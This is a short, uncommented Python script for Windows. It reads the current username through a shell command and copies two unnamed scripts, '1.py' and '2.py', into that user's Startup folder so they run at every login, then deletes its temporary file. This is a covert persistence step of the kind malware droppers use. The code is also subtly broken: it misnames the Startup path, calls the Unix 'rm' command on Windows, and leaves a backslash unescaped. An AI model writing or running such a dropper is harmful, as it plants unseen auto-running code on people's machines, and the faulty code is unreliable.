import os 


os.system('set username > username.txt')

n = open('username.txt')
for line in n :
    line = line.split('=')
    line = line[-1].rstrip()


 
os.system('copy 1.py "C:\\Users\\'+line+'\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programmes\\startup"')
os.system('copy 2.py "C:\\Users\\'+line+'\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programmes\\startup"')
os.system("rm .\username.txt")

